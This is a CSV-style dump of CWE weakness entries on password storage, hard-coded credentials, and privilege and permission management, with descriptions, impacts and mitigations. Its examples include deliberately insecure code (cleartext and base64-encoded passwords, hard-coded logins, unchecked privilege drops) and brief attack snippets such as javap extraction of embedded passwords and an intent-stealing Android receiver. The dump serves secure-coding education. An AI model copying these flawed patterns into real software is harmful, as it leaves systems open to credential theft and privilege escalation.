CWE-257: Storing Passwords in a Recoverable Format,"The storage of passwords in a recoverable format makes them subject to password reuse attacks by malicious users. In fact, it should be noted that recoverable encrypted passwords provide no significant benefit over plaintext passwords since they are subject not only to reuse by malicious attackers but also by malicious insiders. If a system administrator can recover a password directly, or use a brute force search on the available information, the administrator can use the password on other accounts.","Scope: ConfidentialityAccess Control, Impact: Technical Impact:Gain Privileges or Assume IdentityUser's passwords may be revealed., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityRevealed passwords may be reused elsewhere to impersonate the users in question., Likelihood: ","Example 1Both of these examples verify a password by comparing it to a stored compressed version.(bad code)Example Language:Cint VerifyAdmin(char *password) {if (strcmp(compress(password), compressed_password)) {printf(""Incorrect Password!\n"");return(0);}printf(""Entering Diagnostic Mode...\n"");return(1);}(bad code)Example Language:Javaint VerifyAdmin(String password) {if (passwd.Equals(compress(password), compressed_password)) {return(0);}//Diagnostic Modereturn(1);}Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database.Example 2The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.This Java example shows a properties file with a cleartext username / password pair.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.","Phase:  Architecture and DesignUse strong, non-reversible encryption to protect stored passwords."
CWE-258: Empty Password in Configuration File,Using an empty string as a password is insecure.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but the password is provided as an empty string.This Java example shows a properties file with an empty password string.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database and the password is provided as an empty string.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...An empty string should never be used as a password as this can allow unauthorized access to the application. Username and password information should not be included in a configuration file or a properties file in clear text. If possible, encrypt this information and avoidCWE-260andCWE-13.","Phase:  System ConfigurationPasswords should be at least eight characters long -- the longer the better. Avoid passwords that are in any way similar to other passwords you have. Avoid using words that may be found in a dictionary, names book, on a map, etc. Consider incorporating numbers and/or punctuation into your password. If you do use common words, consider replacing letters in that word with numbers and punctuation. However, do not use ""similar-looking"" punctuation. For example, it is not a good idea to change cat to c@t, ca+, (@+, or anything similar. Finally, it is never appropriate to use an empty string as a password."
CWE-259: Use of Hard-coded Password,"The product contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIf hard-coded passwords are used, it is almost certain that malicious users will gain access through the account in question., Likelihood: ","Example 1The following code uses a hard-coded password to connect to a database:(bad code)Example Language:Java...DriverManager.getConnection(url, ""scott"", ""tiger"");...This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user ""scott"" with a password of ""tiger"" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:(attack code)javap -c ConnMngr.class22: ldc #36; //String jdbc:mysql://ixne.com/rxsql24: ldc #38; //String scott26: ldc #17; //String tigerExample 2The following code is an example of an internal hard-coded password in the back-end:(bad code)Example Language:Cint VerifyAdmin(char *password) {if (strcmp(password, ""Mew!"")) {printf(""Incorrect Password!\n"");return(0)}printf(""Entering Diagnostic Mode...\n"");return(1);}(bad code)Example Language:Javaint VerifyAdmin(String password) {if (!password.equals(""Mew!"")) {return(0)}//Diagnostic Modereturn(1);}Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this ""functionality.""Example 3The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.This Java example shows a properties file with a cleartext username / password pair.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.Example 4In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors used hard-coded credentials in their OT products.","Phase:  Architecture and DesignFor outbound authentication: store passwords outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible.Phase:  Architecture and DesignFor inbound authentication: Rather than hard-code a default username and password for first time logins, utilize a ""first login"" mode that requires the user to enter a unique strong password.Phase:  Architecture and DesignPerform access control checks and limit which entities can access the feature that requires the hard-coded password. For example, a feature might only be enabled through the system console instead of through a network connection.Phase:  Architecture and DesignFor inbound authentication: apply strong one-way hashes to your passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When receiving an incoming password during authentication, take the hash of the password and compare it to the hash that you have saved.Use randomly assigned salts for each separate hash that you generate. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.Phase:  Architecture and DesignFor front-end to back-end connections: Three solutions are possible, although none are complete.The first suggestion involves the use of generated passwords which are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.Next, the passwords used should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay style attacks."
CWE-260: Password in Configuration File,The product stores a password in a configuration file that might be accessible to actors who do not know the password.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1Below is a snippet from a Java properties file.(bad code)Example Language:Javawebapp.ldap.username = secretUsernamewebapp.ldap.password = secretPasswordBecause the LDAP credentials are stored in plaintext, anyone with access to the file can gain access to the resource.Example 2The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.This Java example shows a properties file with a cleartext username / password pair.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.",Phase:  Architecture and DesignAvoid storing passwords in easily accessible locations.Phase:  Architecture and DesignConsider storing cryptographic hashes of passwords as an alternative to storing in plaintext.
CWE-261: Weak Encoding for Password,Obscuring a password with a trivial encoding does not protect the password.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1The following code reads a password from a properties file and uses the password to connect to a database.(bad code)Example Language:Java...Properties prop = new Properties();prop.load(new FileInputStream(""config.properties""));String password = Base64.decode(prop.getProperty(""password""));DriverManager.getConnection(url, usr, password);...This code will run successfully, but anyone with access to config.properties can read the value of password and easily determine that the value has been base 64 encoded. If a devious employee has access to this information, they can use it to break into the system.Example 2The following code reads a password from the registry and uses the password to create a new network credential.(bad code)Example Language:C#...string value = regKey.GetValue(passKey).ToString();byte[] decVal = Convert.FromBase64String(value);NetworkCredential netCred = newNetworkCredential(username,decVal.toString(),domain);...This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system.",Passwords should be encrypted with keys that are at least 128 bits in length for adequate security.
CWE-262: Not Using Password Aging,The product does not have a mechanism in place for managing password aging.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAs passwords age, the probability that they are compromised grows., Likelihood: ",Example 1A system does not enforce the changing of passwords every certain period.,"Phase:  Architecture and DesignAs part of a product's design, require users to change their passwords regularly and avoid reusing previous passwords.Phase:  ImplementationDevelopers might disable clipboard paste operations into password fields as a way to discourage users from pasting a password into a clipboard. However, this might encourage users to choose less-secure passwords that are easier to type, and it can reduce the usability of password managers [REF-1294].Effectiveness: Discouraged Common Practice"
CWE-263: Password Aging with Long Expiration,"The product supports password aging, but the expiration period is too long.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAs passwords age, the probability that they are compromised grows., Likelihood: ",Example 1A system requires the changing of passwords every five years.,"Phase:  Architecture and DesignEnsure that password aging is limited so that there is a defined maximum age for passwords. Note that if the expiration window is too short, it can cause users to generate poor or predictable passwords.Phase:  Architecture and DesignEnsure that the user is notified several times leading up to the password expiration.Phase:  Architecture and DesignCreate mechanisms to prevent users from reusing passwords or creating similar passwords.Phase:  ImplementationDevelopers might disable clipboard paste operations into password fields as a way to discourage users from pasting a password into a clipboard. However, this might encourage users to choose less-secure passwords that are easier to type, and it can reduce the usability of password managers [REF-1294].Effectiveness: Discouraged Common Practice"
"CWE CATEGORY: Permissions, Privileges, and Access Controls","Weaknesses in this category are related to the management of permissions, privileges, and other security features that are used to perform access control.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Privilege Issues,"Weaknesses in this category occur with improper handling, assignment, or management of privileges. A privilege is a property of an agent, such as a user. It lets the agent do things that are not ordinarily allowed. For example, there are privileges which allow an agent to perform maintenance functions such as restart a computer.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-266: Incorrect Privilege Assignment,"A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityA user can access restricted functionality and/or sensitive information that may include administrative functionality and user accounts., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Cseteuid(0);/* do some stuff */seteuid(getuid());Example 2The following example demonstrates the weakness.(bad code)Example Language:JavaAccessController.doPrivileged(new PrivilegedAction() {public Object run() {// privileged code goes here, for example:System.loadLibrary(""awt"");return null;// nothing to return}Example 3This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes.(bad code)Example Language:JavaIntent intent = new Intent();intent.setAction(""com.example.BackupUserData"");intent.setData(file_uri);intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);sendBroadcast(intent);(attack code)Example Language:Javapublic class CallReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {Uri userData = intent.getData();stealUserData(userData);}}Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data.","Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
CWE-267: Privilege Defined With Unsafe Actions,"A particular privilege, role, capability, or right can be used to perform unsafe actions that were not intended, even when it is assigned to the correct entity.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityA user can access restricted functionality and/or sensitive information that may include administrative functionality and user accounts., Likelihood: ","Example 1This code intends to allow only Administrators to print debug information about a system.(bad code)Example Language:Javapublic enum Roles {ADMIN,USER,GUEST}public void printDebugInfo(User requestingUser){if(isAuthenticated(requestingUser)){switch(requestingUser.role){case GUEST:System.out.println(""You are not authorized to perform this command"");break;default:System.out.println(currentDebugState());break;}}else{System.out.println(""You must be logged in to perform this command"");}}While the intention was to only allow Administrators to print the debug information, the code as written only excludes those with the role of ""GUEST"". Someone with the role of ""ADMIN"" or ""USER"" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system.","Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
CWE-268: Privilege Chaining,"Two distinct privileges, roles, capabilities, or rights can be combined in a way that allows an entity to perform unsafe actions that would not be allowed without that combination.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityA user can be given or gain access rights of another user. This can give the user unauthorized access to sensitive information including the access information of another user., Likelihood: ","Example 1This code allows someone with the role of ""ADMIN"" or ""OPERATOR"" to reset a user's password. The role of ""OPERATOR"" is intended to have less privileges than an ""ADMIN"", but still be able to help users with small issues such as forgotten passwords.(bad code)Example Language:Javapublic enum Roles {ADMIN,OPERATOR,USER,GUEST}public void resetPassword(User requestingUser, User user, String password ){if(isAuthenticated(requestingUser)){switch(requestingUser.role){case GUEST:System.out.println(""You are not authorized to perform this command"");break;case USER:System.out.println(""You are not authorized to perform this command"");break;default:setPassword(user,password);break;}}else{System.out.println(""You must be logged in to perform this command"");}}This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeConsider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
CWE-269: Improper Privilege Management,"The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1This code temporarily raises the program's privileges to allow creation of a new user folder.(bad code)Example Language:Pythondef makeNewUserDir(username):if invalidUsername(username):#avoidCWE-22andCWE-78print('Usernames cannot contain invalid characters')return Falsetry:raisePrivileges()os.mkdir('/home/' + username)lowerPrivileges()except OSError:print('Unable to create new user directory for user:' + username)return Falsereturn TrueWhile the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.Example 2The following example demonstrates the weakness.(bad code)Example Language:Cseteuid(0);/* do some stuff */seteuid(getuid());Example 3The following example demonstrates the weakness.(bad code)Example Language:JavaAccessController.doPrivileged(new PrivilegedAction() {public Object run() {// privileged code goes here, for example:System.loadLibrary(""awt"");return null;// nothing to return}Example 4This code intends to allow only Administrators to print debug information about a system.(bad code)Example Language:Javapublic enum Roles {ADMIN,USER,GUEST}public void printDebugInfo(User requestingUser){if(isAuthenticated(requestingUser)){switch(requestingUser.role){case GUEST:System.out.println(""You are not authorized to perform this command"");break;default:System.out.println(currentDebugState());break;}}else{System.out.println(""You must be logged in to perform this command"");}}While the intention was to only allow Administrators to print the debug information, the code as written only excludes those with the role of ""GUEST"". Someone with the role of ""ADMIN"" or ""USER"" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system.Example 5This code allows someone with the role of ""ADMIN"" or ""OPERATOR"" to reset a user's password. The role of ""OPERATOR"" is intended to have less privileges than an ""ADMIN"", but still be able to help users with small issues such as forgotten passwords.(bad code)Example Language:Javapublic enum Roles {ADMIN,OPERATOR,USER,GUEST}public void resetPassword(User requestingUser, User user, String password ){if(isAuthenticated(requestingUser)){switch(requestingUser.role){case GUEST:System.out.println(""You are not authorized to perform this command"");break;case USER:System.out.println(""You are not authorized to perform this command"");break;default:setPassword(user,password);break;}}else{System.out.println(""You must be logged in to perform this command"");}}This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account.","Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeFollow the principle of least privilege when assigning access rights to entities in a software system.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeConsider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."
CWE-270: Privilege Context Switching Error,The product does not properly manage privileges while it is switching between different contexts that have different privileges or spheres of control.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityA user can assume the identity of another user with separate privileges in another context. This will give the user unauthorized access that may allow them to acquire the access information of other users., Likelihood: ",无示范例子,"Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeConsider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."
CWE-271: Privilege Dropping / Lowering Errors,The product does not drop privileges before passing control of a resource to an actor that does not have those privileges.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIf privileges are not dropped, neither are access rights of the user. Often these rights can be prevented from being dropped., Likelihood: ; Scope: Access ControlNon-Repudiation, Impact: Technical Impact:Gain Privileges or Assume Identity; Hide ActivitiesIf privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator., Likelihood: ","Example 1The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file.(bad code)Example Language:Cchroot(APP_HOME);chdir(""/"");FILE* data = fopen(argv[1], ""r+"");...Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeConsider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."
CWE-272: Least Privilege Violation,The elevated privilege level required to perform operations such as chroot() should be dropped immediately after the operation is performed.,"Scope: Access ControlConfidentiality, Impact: Technical Impact:Gain Privileges or Assume Identity; Read Application Data; Read Files or DirectoriesAn attacker may be able to access resources with the elevated privilege that could not be accessed with the attacker's original privileges. This is particularly likely in conjunction with another flaw, such as a buffer overflow., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Csetuid(0);// Do some important stuffsetuid(old_uid);// Do some non privileged stuff.Example 2The following example demonstrates the weakness.(bad code)Example Language:JavaAccessController.doPrivileged(new PrivilegedAction() {public Object run() {// privileged code goes here, for example:System.loadLibrary(""awt"");return null;// nothing to return}Example 3The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file.(bad code)Example Language:Cchroot(APP_HOME);chdir(""/"");FILE* data = fopen(argv[1], ""r+"");...Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.","Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeFollow the principle of least privilege when assigning access rights to entities in a software system.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-273: Improper Check for Dropped Privileges,The product attempts to drop privileges but does not check or incorrectly checks to see if the drop succeeded.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIf privileges are not dropped, neither are access rights of the user. Often these rights can be prevented from being dropped., Likelihood: ; Scope: Access ControlNon-Repudiation, Impact: Technical Impact:Gain Privileges or Assume Identity; Hide ActivitiesIf privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator., Likelihood: ","Example 1This code attempts to take on the privileges of a user before creating a file, thus avoiding performing the action with unnecessarily high privileges:(bad code)Example Language:C++bool DoSecureStuff(HANDLE hPipe) {bool fDataWritten = false;ImpersonateNamedPipeClient(hPipe);HANDLE hFile = CreateFile(...);/../RevertToSelf()/../}The call to ImpersonateNamedPipeClient may fail, but the return value is not checked. If the call fails, the code may execute with higher privileges than intended. In this case, an attacker could exploit this behavior to write a file to a location that the attacker does not have access to.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phase:  ImplementationCheck the results of all functions that return a value and verify that the value is expected.Effectiveness: HighNote:Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment.Phase:  ImplementationIn Windows, make sure that the process token has the SeImpersonatePrivilege(Microsoft Server 2003). Code that relies on impersonation for security must ensure that the impersonation succeeded, i.e., that a proper privilege demotion happened."
CWE-274: Improper Handling of Insufficient Privileges,"The product does not handle or incorrectly handles when it has insufficient privileges to perform an operation, leading to resultant weaknesses.","Scope: Other, Impact: Technical Impact:Other; Alter Execution Logic, Likelihood: ",无示范例子,无可能的缓解方案
CWE CATEGORY: Permission Issues,Weaknesses in this category are related to improper assignment or handling of permissions.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-276: Incorrect Default Permissions,"During installation, installed file permissions are set to allow anyone to modify those files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,"Phases:  Architecture and Design; OperationThe architecture needs to access and modification attributes for files to only those users who actually require those actions.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-277: Insecure Inherited Permissions,A product defines a set of insecure permissions that are inherited by objects that are created by the program.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,"Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-278: Insecure Preserved Inherited Permissions,"A product inherits a set of insecure permissions for an object, e.g. when copying from an archive file, without user awareness or involvement.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,"Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-279: Incorrect Execution-Assigned Permissions,"While it is executing, the product sets the permissions of an object in a way that violates the intended permissions that have been specified by the user.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,"Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges."
CWE-280: Improper Handling of Insufficient Permissions or Privileges,The product does not handle or incorrectly handles when it has insufficient privileges to access resources or functionality as specified by their permissions. This may cause it to follow unexpected code paths that may leave the product in an invalid state.,"Scope: Other, Impact: Technical Impact:Other; Alter Execution Logic, Likelihood: ",无示范例子,"Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phase:  ImplementationAlways check to see if you have successfully accessed a resource or system functionality, and use proper error handling if it is unsuccessful. Do this even when you are operating in a highly privileged mode, because errors or environmental conditions might still cause a failure. For example, environments with highly granular permissions/privilege models, such as Windows or Linux capabilities, can cause unexpected failures."
CWE-281: Improper Preservation of Permissions,"The product does not preserve permissions or incorrectly preserves permissions when copying, restoring, or sharing objects, which can cause them to have less restrictive permissions than intended.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-282: Improper Ownership Management,"The product assigns the wrong ownership, or does not properly verify the ownership, of an object or resource.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1This function is part of a privileged program that takes input from users with potentially lower privileges.(bad code)Example Language:Pythondef killProcess(processID):os.kill(processID, signal.SIGKILL)This code does not confirm that the process to be killed is owned by the requesting user, thus allowing an attacker to kill arbitrary processes.This function remedies the problem by checking the owner of the process before killing it:(good code)Example Language:Pythondef killProcess(processID):user = getCurrentUser()#Check process owner against requesting userif getProcessOwner(processID) == user:os.kill(processID, signal.SIGKILL)returnelse:print(""You cannot kill a process you don't own"")return","Phases:  Architecture and Design; OperationVery carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."
